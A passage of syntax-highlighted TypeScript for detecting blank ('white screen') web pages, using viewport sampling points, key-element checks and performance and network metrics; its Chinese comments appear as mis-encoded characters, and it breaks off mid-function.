  <span class="hljs-comment">// å¦‚æœåªæ˜¯ç©ºçš„åŒ…è£…å…ƒç´ ï¼Œè®¤ä¸ºæ˜¯åŒ…è£…å…ƒç´ </span>
  <span class="hljs-keyword">if</span> (!hasText &amp;&amp; !hasBackground &amp;&amp; element === <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
  }
  
  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}

<span class="hljs-comment">/**
 * æ£€æŸ¥å…ƒç´ æ˜¯å¦æœ‰èƒŒæ™¯å†…å®¹
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">hasBackgroundContent</span>(<span class="hljs-params">element: Element</span>): <span class="hljs-built_in">boolean</span> {
  <span class="hljs-keyword">const</span> style = <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">getComputedStyle</span>(element);
  
  <span class="hljs-comment">// æ£€æŸ¥èƒŒæ™¯é¢œè‰²ï¼ˆæ’é™¤ç™½è‰²å’Œé€æ˜ï¼‰</span>
  <span class="hljs-keyword">const</span> bgColor = style.<span class="hljs-property">backgroundColor</span>;
  <span class="hljs-keyword">if</span> (bgColor &amp;&amp; bgColor !== <span class="hljs-string">'rgba(0, 0, 0, 0)'</span> &amp;&amp; bgColor !== <span class="hljs-string">'transparent'</span>) {
    <span class="hljs-comment">// è§£æé¢œè‰²å€¼åˆ¤æ–­æ˜¯å¦ä¸ºç™½è‰²</span>
    <span class="hljs-keyword">const</span> isWhite = <span class="hljs-title function_">isWhiteColor</span>(bgColor);
    <span class="hljs-keyword">if</span> (!isWhite) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
  }
  
  <span class="hljs-comment">// æ£€æŸ¥èƒŒæ™¯å›¾ç‰‡</span>
  <span class="hljs-keyword">const</span> bgImage = style.<span class="hljs-property">backgroundImage</span>;
  <span class="hljs-keyword">if</span> (bgImage &amp;&amp; bgImage !== <span class="hljs-string">'none'</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
  }
  
  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}

<span class="hljs-comment">/**
 * åˆ¤æ–­é¢œè‰²æ˜¯å¦ä¸ºç™½è‰²
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">isWhiteColor</span>(<span class="hljs-params">color: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">boolean</span> {
  <span class="hljs-comment">// å¤„ç† rgb/rgba æ ¼å¼</span>
  <span class="hljs-keyword">const</span> rgbMatch = color.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/rgba?\((\d+),\s*(\d+),\s*(\d+)/</span>);
  <span class="hljs-keyword">if</span> (rgbMatch) {
    <span class="hljs-keyword">const</span> [, r, g, b] = rgbMatch.<span class="hljs-title function_">map</span>(<span class="hljs-title class_">Number</span>);
    <span class="hljs-comment">// æ¥è¿‘ç™½è‰²çš„é˜ˆå€¼</span>
    <span class="hljs-keyword">return</span> r &gt; <span class="hljs-number">250</span> &amp;&amp; g &gt; <span class="hljs-number">250</span> &amp;&amp; b &gt; <span class="hljs-number">250</span>;
  }
  
  <span class="hljs-comment">// å¤„ç†åå…­è¿›åˆ¶æ ¼å¼</span>
  <span class="hljs-keyword">if</span> (color.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'#'</span>)) {
    <span class="hljs-keyword">const</span> hex = color.<span class="hljs-title function_">slice</span>(<span class="hljs-number">1</span>);
    <span class="hljs-keyword">const</span> r = <span class="hljs-built_in">parseInt</span>(hex.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>), <span class="hljs-number">16</span>);
    <span class="hljs-keyword">const</span> g = <span class="hljs-built_in">parseInt</span>(hex.<span class="hljs-title function_">slice</span>(<span class="hljs-number">2</span>, <span class="hljs-number">4</span>), <span class="hljs-number">16</span>);
    <span class="hljs-keyword">const</span> b = <span class="hljs-built_in">parseInt</span>(hex.<span class="hljs-title function_">slice</span>(<span class="hljs-number">4</span>, <span class="hljs-number">6</span>), <span class="hljs-number">16</span>);
    <span class="hljs-keyword">return</span> r &gt; <span class="hljs-number">250</span> &amp;&amp; g &gt; <span class="hljs-number">250</span> &amp;&amp; b &gt; <span class="hljs-number">250</span>;
  }
  
  <span class="hljs-keyword">return</span> color === <span class="hljs-string">'white'</span> || color === <span class="hljs-string">'#fff'</span> || color === <span class="hljs-string">'#ffffff'</span>;
}

<span class="hljs-comment">/**
 * è·å–ç½‘ç»œä¿¡æ¯
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getNetworkInfo</span>(<span class="hljs-params"/>): <span class="hljs-title class_">NetworkInfo</span> {
  <span class="hljs-keyword">const</span> connection = (navigator <span class="hljs-keyword">as</span> <span class="hljs-title class_">Navigator</span> &amp; {
    connection?: {
      effectiveType?: <span class="hljs-built_in">string</span>;
      downlink?: <span class="hljs-built_in">number</span>;
      rtt?: <span class="hljs-built_in">number</span>;
    };
  }).<span class="hljs-property">connection</span>;
  
  <span class="hljs-keyword">return</span> {
    <span class="hljs-attr">effectiveType</span>: connection?.<span class="hljs-property">effectiveType</span>,
    <span class="hljs-attr">downlink</span>: connection?.<span class="hljs-property">downlink</span>,
    <span class="hljs-attr">rtt</span>: connection?.<span class="hljs-property">rtt</span>,
    <span class="hljs-attr">online</span>: navigator.<span class="hljs-property">onLine</span>
  };
}

<span class="hljs-comment">/**
 * è·å–æ€§èƒ½æ•°æ®
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getPerformanceData</span>(<span class="hljs-params"/>): <span class="hljs-title class_">PerformanceData</span> {
  <span class="hljs-keyword">const</span> <span class="hljs-attr">performanceData</span>: <span class="hljs-title class_">PerformanceData</span> = {};
  
  <span class="hljs-comment">// è·å–å¯¼èˆªæ€§èƒ½æ•°æ®</span>
  <span class="hljs-keyword">const</span> navigation = performance.<span class="hljs-title function_">getEntriesByType</span>(<span class="hljs-string">'navigation'</span>)[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> <span class="hljs-title class_">PerformanceNavigationTiming</span>;
  <span class="hljs-keyword">if</span> (navigation) {
    performanceData.<span class="hljs-property">domContentLoaded</span> = navigation.<span class="hljs-property">domContentLoadedEventEnd</span> - navigation.<span class="hljs-property">startTime</span>;
    performanceData.<span class="hljs-property">loadComplete</span> = navigation.<span class="hljs-property">loadEventEnd</span> - navigation.<span class="hljs-property">startTime</span>;
  }
  
  <span class="hljs-comment">// è·å–ç»˜åˆ¶æ€§èƒ½æ•°æ®</span>
  <span class="hljs-keyword">const</span> paintEntries = performance.<span class="hljs-title function_">getEntriesByType</span>(<span class="hljs-string">'paint'</span>);
  paintEntries.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">entry</span> =&gt;</span> {
    <span class="hljs-keyword">if</span> (entry.<span class="hljs-property">name</span> === <span class="hljs-string">'first-contentful-paint'</span>) {
      performanceData.<span class="hljs-property">firstContentfulPaint</span> = entry.<span class="hljs-property">startTime</span>;
    }
  });
  
  <span class="hljs-comment">// è·å– LCP</span>
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> lcpEntries = performance.<span class="hljs-title function_">getEntriesByType</span>(<span class="hljs-string">'largest-contentful-paint'</span>);
    <span class="hljs-keyword">if</span> (lcpEntries.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">const</span> lastLcp = lcpEntries[lcpEntries.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>] <span class="hljs-keyword">as</span> <span class="hljs-title class_">PerformanceEntry</span> &amp; { <span class="hljs-attr">startTime</span>: <span class="hljs-built_in">number</span> };
      performanceData.<span class="hljs-property">largestContentfulPaint</span> = lastLcp.<span class="hljs-property">startTime</span>;
    }
  } <span class="hljs-keyword">catch</span> {
    <span class="hljs-comment">// LCP å¯èƒ½ä¸è¢«æ”¯æŒ</span>
  }
  
  <span class="hljs-keyword">return</span> performanceData;
}

<span class="hljs-comment">// ==================== é‡‡æ ·ç‚¹æ£€æµ‹å™¨ ====================</span>

<span class="hljs-comment">/**
 * é‡‡æ ·ç‚¹æ£€æµ‹å™¨ç±»
 */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">SamplingDetector</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">config</span>: <span class="hljs-title class_">Required</span>&lt;<span class="hljs-title class_">Pick</span>&lt;<span class="hljs-title class_">WhiteScreenConfig</span>, 
    <span class="hljs-string">'samplingPoints'</span> | <span class="hljs-string">'threshold'</span> | <span class="hljs-string">'ignoreSelectors'</span> | <span class="hljs-string">'container'</span>
  &gt;&gt;;
  
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">config: Partial&lt;WhiteScreenConfig&gt; = {}</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span> = {
      <span class="hljs-attr">samplingPoints</span>: config.<span class="hljs-property">samplingPoints</span> ?? <span class="hljs-number">17</span>,
      <span class="hljs-attr">threshold</span>: config.<span class="hljs-property">threshold</span> ?? <span class="hljs-number">0.95</span>,
      <span class="hljs-attr">ignoreSelectors</span>: config.<span class="hljs-property">ignoreSelectors</span> ?? [],
      <span class="hljs-attr">container</span>: config.<span class="hljs-property">container</span> ?? <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>
    };
  }
  
  <span class="hljs-comment">/**
   * æ‰§è¡Œé‡‡æ ·æ£€æµ‹
   */</span>
  <span class="hljs-title function_">detect</span>(): <span class="hljs-title class_">SamplingResult</span> {
    <span class="hljs-keyword">const</span> { samplingPoints, ignoreSelectors, container } = <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>;
    <span class="hljs-keyword">const</span> <span class="hljs-attr">points</span>: <span class="hljs-title class_">SamplingPointDetail</span>[] = [];
    
    <span class="hljs-comment">// è·å–è§†å£å°ºå¯¸</span>
    <span class="hljs-keyword">const</span> viewportWidth = <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span> || <span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>.<span class="hljs-property">clientWidth</span>;
    <span class="hljs-keyword">const</span> viewportHeight = <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span> || <span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>.<span class="hljs-property">clientHeight</span>;
    
    <span class="hljs-comment">// è®¡ç®—é‡‡æ ·é—´éš”</span>
    <span class="hljs-keyword">const</span> horizontalStep = viewportWidth / (samplingPoints + <span class="hljs-number">1</span>);
    <span class="hljs-keyword">const</span> verticalStep = viewportHeight / (samplingPoints + <span class="hljs-number">1</span>);
    
    <span class="hljs-keyword">let</span> emptyPoints = <span class="hljs-number">0</span>;
    
    <span class="hljs-comment">// ç”Ÿæˆé‡‡æ ·ç‚¹çŸ©é˜µ</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt;= samplingPoints; i++) {
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> j = <span class="hljs-number">1</span>; j &lt;= samplingPoints; j++) {
        <span class="hljs-keyword">const</span> x = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(horizontalStep * i);
        <span class="hljs-keyword">const</span> y = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(verticalStep * j);
        
        <span class="hljs-keyword">const</span> pointResult = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">checkPoint</span>(x, y, ignoreSelectors);
        points.<span class="hljs-title function_">push</span>(pointResult);
        
        <span class="hljs-keyword">if</span> (pointResult.<span class="hljs-property">isEmpty</span>) {
          emptyPoints++;
        }
      }
    }
    
    <span class="hljs-comment">// æ·»åŠ ä¸­å¿ƒç‚¹æ£€æµ‹ï¼ˆæƒé‡æ›´é«˜ï¼‰</span>
    <span class="hljs-keyword">const</span> centerX = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(viewportWidth / <span class="hljs-number">2</span>);
    <span class="hljs-keyword">const</span> centerY = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(viewportHeight / <span class="hljs-number">2</span>);
    <span class="hljs-keyword">const</span> centerPoints = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">checkCenterRegion</span>(centerX, centerY, ignoreSelectors);
    points.<span class="hljs-title function_">push</span>(...centerPoints);
    
    centerPoints.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">point</span> =&gt;</span> {
      <span class="hljs-keyword">if</span> (point.<span class="hljs-property">isEmpty</span>) emptyPoints++;
    });
    
    <span class="hljs-keyword">const</span> totalPoints = points.<span class="hljs-property">length</span>;
    <span class="hljs-keyword">const</span> emptyRatio = totalPoints &gt; <span class="hljs-number">0</span> ? emptyPoints / totalPoints : <span class="hljs-number">1</span>;
    
    <span class="hljs-keyword">return</span> {
      totalPoints,
      emptyPoints,
      emptyRatio,
      <span class="hljs-attr">pointDetails</span>: points
    };
  }
  
  <span class="hljs-comment">/**
   * æ£€æŸ¥å•ä¸ªé‡‡æ ·ç‚¹
   */</span>
  <span class="hljs-keyword">private</span> <span class="hljs-title function_">checkPoint</span>(
    <span class="hljs-attr">x</span>: <span class="hljs-built_in">number</span>,
    <span class="hljs-attr">y</span>: <span class="hljs-built_in">number</span>,
    <span class="hljs-attr">ignoreSelectors</span>: <span class="hljs-built_in">string</span>[]
  ): <span class="hljs-title class_">SamplingPointDetail</span> {
    <span class="hljs-keyword">const</span> element = <span class="hljs-title function_">getElementAtPoint</span>(x, y);
    
    <span class="hljs-keyword">const</span> <span class="hljs-attr">detail</span>: <span class="hljs-title class_">SamplingPointDetail</span> = {
      x,
      y,
      <span class="hljs-attr">tagName</span>: element?.<span class="hljs-property">tagName</span> ?? <span class="hljs-literal">null</span>,
      <span class="hljs-attr">isEmpty</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">className</span>: element?.<span class="hljs-property">className</span>?.<span class="hljs-title function_">toString</span>(),
      <span class="hljs-attr">id</span>: element?.<span class="hljs-property">id</span>
    };
    
    <span class="hljs-keyword">if</span> (!element) {
      <span class="hljs-keyword">return</span> detail;
    }
    
    <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦åœ¨å¿½ç•¥åˆ—è¡¨ä¸­</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">shouldIgnoreElement</span>(element, ignoreSelectors)) {
      <span class="hljs-keyword">return</span> detail;
    }
    
    <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦ä¸ºæœ‰æ•ˆå†…å®¹å…ƒç´ </span>
    detail.<span class="hljs-property">isEmpty</span> = !<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">isContentElement</span>(element);
    
    <span class="hljs-keyword">return</span> detail;
  }
  
  <span class="hljs-comment">/**
   * æ£€æŸ¥ä¸­å¿ƒåŒºåŸŸï¼ˆä¹å®«æ ¼ï¼‰
   */</span>
  <span class="hljs-keyword">private</span> <span class="hljs-title function_">checkCenterRegion</span>(
    <span class="hljs-attr">centerX</span>: <span class="hljs-built_in">number</span>,
    <span class="hljs-attr">centerY</span>: <span class="hljs-built_in">number</span>,
    <span class="hljs-attr">ignoreSelectors</span>: <span class="hljs-built_in">string</span>[]
  ): <span class="hljs-title class_">SamplingPointDetail</span>[] {
    <span class="hljs-keyword">const</span> <span class="hljs-attr">points</span>: <span class="hljs-title class_">SamplingPointDetail</span>[] = [];
    <span class="hljs-keyword">const</span> offsets = [-<span class="hljs-number">50</span>, <span class="hljs-number">0</span>, <span class="hljs-number">50</span>];
    
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> offsetX <span class="hljs-keyword">of</span> offsets) {
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> offsetY <span class="hljs-keyword">of</span> offsets) {
        <span class="hljs-keyword">if</span> (offsetX === <span class="hljs-number">0</span> &amp;&amp; offsetY === <span class="hljs-number">0</span>) <span class="hljs-keyword">continue</span>; <span class="hljs-comment">// è·³è¿‡æ­£ä¸­å¿ƒï¼Œå·²åœ¨ä¸»å¾ªç¯ä¸­å¤„ç†</span>
        
        <span class="hljs-keyword">const</span> x = centerX + offsetX;
        <span class="hljs-keyword">const</span> y = centerY + offsetY;
        
        <span class="hljs-keyword">if</span> (x &gt; <span class="hljs-number">0</span> &amp;&amp; y &gt; <span class="hljs-number">0</span>) {
          points.<span class="hljs-title function_">push</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">checkPoint</span>(x, y, ignoreSelectors));
        }
      }
    }
    
    <span class="hljs-keyword">return</span> points;
  }
  
  <span class="hljs-comment">/**
   * åˆ¤æ–­å…ƒç´ æ˜¯å¦åº”è¢«å¿½ç•¥
   */</span>
  <span class="hljs-keyword">private</span> <span class="hljs-title function_">shouldIgnoreElement</span>(<span class="hljs-attr">element</span>: <span class="hljs-title class_">Element</span>, <span class="hljs-attr">ignoreSelectors</span>: <span class="hljs-built_in">string</span>[]): <span class="hljs-built_in">boolean</span> {
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> selector <span class="hljs-keyword">of</span> ignoreSelectors) {
      <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">if</span> (element.<span class="hljs-title function_">matches</span>(selector) || element.<span class="hljs-title function_">closest</span>(selector)) {
          <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        }
      } <span class="hljs-keyword">catch</span> {
        <span class="hljs-comment">// é€‰æ‹©å™¨æ— æ•ˆï¼Œå¿½ç•¥</span>
      }
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
  }
  
  <span class="hljs-comment">/**
   * åˆ¤æ–­æ˜¯å¦ä¸ºæœ‰å†…å®¹çš„å…ƒç´ 
   */</span>
  <span class="hljs-keyword">private</span> <span class="hljs-title function_">isContentElement</span>(<span class="hljs-attr">element</span>: <span class="hljs-title class_">Element</span>): <span class="hljs-built_in">boolean</span> {
    <span class="hljs-keyword">const</span> tagName = element.<span class="hljs-property">tagName</span>.<span class="hljs-title function_">toUpperCase</span>();
    
    <span class="hljs-comment">// æ˜ç¡®çš„å†…å®¹å…ƒç´ </span>
    <span class="hljs-keyword">const</span> contentTags = [
      <span class="hljs-string">'IMG'</span>, <span class="hljs-string">'VIDEO'</span>, <span class="hljs-string">'AUDIO'</span>, <span class="hljs-string">'CANVAS'</span>, <span class="hljs-string">'SVG'</span>, <span class="hljs-string">'IFRAME'</span>,
      <span class="hljs-string">'INPUT'</span>, <span class="hljs-string">'TEXTAREA'</span>, <span class="hljs-string">'SELECT'</span>, <span class="hljs-string">'BUTTON'</span>,
      <span class="hljs-string">'H1'</span>, <span class="hljs-string">'H2'</span>, <span class="hljs-string">'H3'</span>, <span class="hljs-string">'H4'</span>, <span class="hljs-string">'H5'</span>, <span class="hljs-string">'H6'</span>,
      <span class="hljs-string">'P'</span>, <span class="hljs-string">'A'</span>, <span class="hljs-string">'SPAN'</span>, <span class="hljs-string">'LABEL'</span>, <span class="hljs-string">'LI'</span>, <span class="hljs-string">'TD'</span>, <span class="hljs-string">'TH'</span>,
      <span class="hljs-string">'STRONG'</span>, <span class="hljs-string">'EM'</span>, <span class="hljs-string">'B'</span>, <span class="hljs-string">'I'</span>, <span class="hljs-string">'U'</span>, <span class="hljs-string">'CODE'</span>, <span class="hljs-string">'PRE'</span>
    ];
    
    <span class="hljs-keyword">if</span> (contentTags.<span class="hljs-title function_">includes</span>(tagName)) {
      <span class="hljs-keyword">return</span> <span class="hljs-title function_">isElementVisible</span>(element);
    }
    
    <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æœ‰æ–‡æœ¬å†…å®¹</span>
    <span class="hljs-keyword">const</span> textContent = element.<span class="hljs-property">textContent</span>?.<span class="hljs-title function_">trim</span>();
    <span class="hljs-keyword">if</span> (textContent &amp;&amp; textContent.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">return</span> <span class="hljs-title function_">isElementVisible</span>(element);
    }
    
    <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æœ‰èƒŒæ™¯å†…å®¹</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">hasBackgroundContent</span>(element)) {
      <span class="hljs-keyword">return</span> <span class="hljs-title function_">isElementVisible</span>(element);
    }
    
    <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦ä¸ºåŒ…è£…å…ƒç´ </span>
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isWrapperElement</span>(element)) {
      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
    
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">isElementVisible</span>(element);
  }
  
  <span class="hljs-comment">/**
   * åˆ¤æ–­æ˜¯å¦ä¸ºç™½å±
   */</span>
  <span class="hljs-title function_">isWhiteScreen</span>(<span class="hljs-attr">result</span>: <span class="hljs-title class_">SamplingResult</span>): <span class="hljs-built_in">boolean</span> {
    <span class="hljs-keyword">return</span> result.<span class="hljs-property">emptyRatio</span> &gt;= <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">threshold</span>;
  }
}

<span class="hljs-comment">// ==================== DOM æ£€æµ‹å™¨ ====================</span>

<span class="hljs-comment">/**
 * DOM æ£€æµ‹å™¨ç±»
 */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">DOMDetector</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">config</span>: <span class="hljs-title class_">Required</span>&lt;<span class="hljs-title class_">Pick</span>&lt;<span class="hljs-title class_">WhiteScreenConfig</span>, 
    <span class="hljs-string">'keyElementSelectors'</span> | <span class="hljs-string">'container'</span>
  &gt;&gt;;
  
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">config: Partial&lt;WhiteScreenConfig&gt; = {}</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span> = {
      <span class="hljs-attr">keyElementSelectors</span>: config.<span class="hljs-property">keyElementSelectors</span> ?? [
        <span class="hljs-string">'#app'</span>, <span class="hljs-string">'#root'</span>, <span class="hljs-string">'.app'</span>, <span class="hljs-string">'.main-content'</span>,
        <span class="hljs-string">'main'</span>, <span class="hljs-string">'[data-page]'</span>, <span class="hljs-string">'.page-container'</span>
      ],
      <span class="hljs-attr">container</span>: config.<span class="hljs-property">container</span> ?? <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>
    };
  }
  
  <span class="hljs-comment">/**
   * æ‰§è¡Œ DOM æ£€æµ‹
   */</span>
  <span class="hljs-title function_">detect</span>(): <span class="hljs-title class_">DOMDetectionResult</span> {
    <span class="hljs-keyword">const</span> { keyElementSelectors, container } = <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>;
    <span class="hljs-keyword">const</span> <span class="hljs-attr">elementDetails</span>: <span class="hljs-title class_">ElementDetail</span>[] = [];
    <span class="hljs-keyword">const</span> <span class="hljs-attr">missingSelectors</span>: <span class="hljs-built_in">string</span>[] = [];
    <span class="hljs-keyword">let</span> foundElements = <span class="hljs-number">0</span>;
    
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> selector <span class="hljs-keyword">of</span> keyElementSelectors) {
      <span class="hljs-keyword">const</span> result = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">checkElement</span>(selector, container);
      elementDetails.<span class="hljs-title function_">push</span>(result);
      
      <span class="hljs-keyword">if</span> (result.<span class="hljs-property">exists</span> &amp;&amp; result.<span class="hljs-property">isVisible</span>) {
        foundElements++;
      } <span class="hljs-keyword">else</span> {
        missingSelectors.<span class="hljs-title function_">push</span>(selector);
      }
    }
    
    <span class="hljs-keyword">const</span> expectedElements = keyElementSelectors.<span class="hljs-property">length</span>;
    <span class="hljs-keyword">const</span> passed = foundElements &gt; <span class="hljs-number">0</span>;
    
    <span class="hljs-keyword">return</span> {
      passed,
      foundElements,
      expectedElements,
      missingSelectors,
      elementDetails
    };
  }
  
  <span class="hljs-comment">/**
   * æ£€æŸ¥å•ä¸ªå…ƒç´ 
   */</span>
  <span class="hljs-keyword">private</span> <span class="hljs-title function_">checkElement</span>(
    <span class="hljs-attr">selector</span>: <span class="hljs-built_in">string</span>,
    <span class="hljs-attr">container</span>: <span class="hljs-title class_">HTMLElement</span> | <span class="hljs-literal">null</span>
  ): <span class="hljs-title class_">ElementDetail</span> {
    <span class="hljs-keyword">const</span> searchRoot = container ?? <span class="hljs-variable language_">document</span>;
    
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> element = searchRoot.<span class="hljs-title function_">querySelector</span>(selector);
      
      <span class="hljs-keyword">if</span> (!element) {
        <span class="hljs-keyword">return</span> {
          selector,
          <span class="hljs-attr">exists</span>: <span class="hljs-literal">false</span>,
          <span class="hljs-attr">isVisible</span>: <span class="hljs-literal">false</span>
        };
      }
      
      <span class="hljs-keyword">const</span> isVisible = <span class="hljs-title function_">isElementVisible</span>(element);
      <span class="hljs-keyword">const</span> rect = element.<span class="hljs-title function_">getBoundingClientRect</span>();
      
      <span class="hljs-keyword">return</span> {
        selector,
        <span class="hljs-attr">exists</span>: <span class="hljs-literal">true</span>,
        isVisible,
        <span class="hljs-attr">dimensions</span>: {
          <span class="hljs-attr">width</span>: rect.<span class="hljs-property">width</span>,
          <span class="hljs-attr">height</span>: rect.<span class="hljs-property">height</span>
        }
      };
    } <span class="hljs-keyword">catch</span> {
      <span class="hljs-keyword">return</span> {
        selector,
        <span class="hljs-attr">exists</span>: <span class="hljs-literal">false</span>,
        <span class="hljs-attr">isVisible</span>: <span class="hljs-literal">false</span>
      };
    }
  }
  
  <span class="hljs-comment">/**
   * æ£€æµ‹é¡µé¢æ˜¯å¦æœ‰æœ‰æ•ˆå†…å®¹
   */</span>
  <span class="hljs-title function_">hasValidContent</span>(): <span class="hljs-built_in">boolean</span> {
    <span class="hljs-keyword">const</span> body = <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>;
    <span class="hljs-keyword">if</span> (!body) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    
    <span class="hljs-comment">// æ£€æŸ¥ body æ˜¯å¦æœ‰å­å…ƒç´ </span>
    <span class="hljs-keyword">if</span> (body.<span class="hljs-property">children</span>.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    
    <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æœ‰å¯è§çš„å­å…ƒç´ </span>
    <span class="hljs-keyword">const</span> children = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(body.<span class="hljs-property">children</span>);
    <span class="hljs-keyword">const</span> visibleChildren = children.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">child</span> =&gt;</span> <span class="hljs-title function_">isElementVisible</span>(child));
    
    <span class="hljs-keyword">if</span> (visibleChildren.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    
    <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æœ‰å®é™…å†…å®¹ï¼ˆæ–‡æœ¬æˆ–åª’ä½“ï¼‰</span>
    <span class="hljs-keyword">const</span> hasContent = visibleChildren.<span class="hljs-title function_">some</span>(<span class="hljs-function"><span class="hljs-params">child</span> =&gt;</span> {
      <span class="hljs-comment">// æ£€æŸ¥æ–‡æœ¬å†…å®¹</span>
      <span class="hljs-keyword">const</span> text = child.<span class="hljs-property">textContent</span>?.<span class="hljs-title function_">trim</span>();
      <span class="hljs-keyword">if</span> (text &amp;&amp; text.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
      
      <span class="hljs-comment">// æ£€æŸ¥åª’ä½“å…ƒç´ </span>
      <span class="hljs-keyword">const</span> mediaElements = child.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">'img, video, canvas, svg, iframe'</span>);
      <span class="hljs-keyword">if</span> (mediaElements.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
      
      <span class="hljs-comment">// æ£€æŸ¥èƒŒæ™¯</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-title function_">hasBackgroundContent</span>(child)) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
      
      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    });
    
    <span class="hljs-keyword">return</span> hasContent;
  }
  
  <span class="hljs-comment">/**
   * è·å–é¡µé¢ DOM ç»Ÿè®¡ä¿¡æ¯
   */</span>
  <span class="hljs-title function_">getDOMStats</span>(): {
    <span class="hljs-attr">totalElements</span>: <span class="hljs-built_in">number</span>;
    <span class="hljs-attr">visibleElements</span>: <span class="hljs-built_in">number</span>;
    <span class="hljs-attr">textNodes</span>: <span class="hljs-built_in">number</span>;
    <span class="hljs-attr">mediaElements</span>: <span class="hljs-built_in">number</span>;
    <span class="hljs-attr">interactiveElements</span>: <span class="hljs-built_in">number</span>;
  } {
    <span class="hljs-keyword">const</span> allElements = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">'*'</span>);
    <span class="hljs-keyword">let</span> visibleElements = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">let</span> textNodes = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">let</span> mediaElements = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">let</span> interactiveElements = <span class="hljs-number">0</span>;
    
